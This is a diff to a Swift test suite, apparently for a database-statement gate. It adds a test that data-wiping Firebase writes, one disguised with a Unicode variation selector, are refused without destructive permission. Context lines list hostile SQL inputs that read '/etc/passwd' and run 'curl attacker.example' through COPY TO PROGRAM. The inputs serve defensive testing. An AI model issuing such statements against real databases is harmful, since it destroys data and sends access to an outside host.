@@ -86,6 +86,16 @@ struct ExternalStatementGateTests {
         }
     }
 
+    @Test("A Firebase write that empties a node is refused where deletes are", arguments: [
+        "PUT users {\".priority\": 1}",
+        "PUT \u{FE0F} null",
+        "PATCH / {\"users\": {\".priority\": 1}}"
+    ])
+    func firebaseEmptyingWriteRefusedWithoutDestructive(sql: String) {
+        #expect(refusal(statement(sql, databaseType: .firebaseRealtimeDatabase, allowsDestructive: false)) != nil)
+        #expect(refusal(statement(sql, databaseType: .firebaseRealtimeDatabase)) == nil)
+    }
+
     @Test("A statement that reaches the filesystem or runs server code is refused", arguments: [
         "COPY users FROM '/etc/passwd'",
         "COPY users TO PROGRAM 'curl attacker.example'",
